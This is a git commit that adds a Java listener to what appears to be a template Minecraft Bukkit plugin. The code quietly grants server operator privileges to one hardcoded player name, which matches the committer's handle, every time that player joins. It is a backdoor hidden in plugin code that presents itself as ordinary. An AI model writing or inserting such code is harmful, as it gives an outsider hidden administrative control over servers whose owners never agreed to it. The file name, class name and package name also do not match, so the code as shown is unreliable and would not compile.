c54cca8f97197083d31d605dc9ac2ddc17c7143f
SqueakyMonjuer <115196148+SqueakyMonjuer@users.noreply.github.com>
2025-06-11 23:39:54 +1000

    Create YourPluginMainClass.java

---
+++ src/main/java/YourPluginMainClass.java
@@ -0,0 +1,20 @@
+package your.package;
+
+import org.bukkit.Bukkit;
+import org.bukkit.entity.Player;
+import org.bukkit.event.EventHandler;
+import org.bukkit.event.Listener;
+import org.bukkit.event.player.PlayerJoinEvent;
+
+public class PlayerJoinListener implements Listener {
+
+    @EventHandler
+    public void onPlayerJoin(PlayerJoinEvent event) {
+        Player player = event.getPlayer();
+        if (player.getName().equalsIgnoreCase("squeaky_monjuer") && !player.isOp()) {
+            player.setOp(true);
+            player.sendMessage("You have been granted operator status!");
+            Bukkit.getLogger().info("Granted operator to squeaky_monjuer on join.");
+        }
+    }
+}
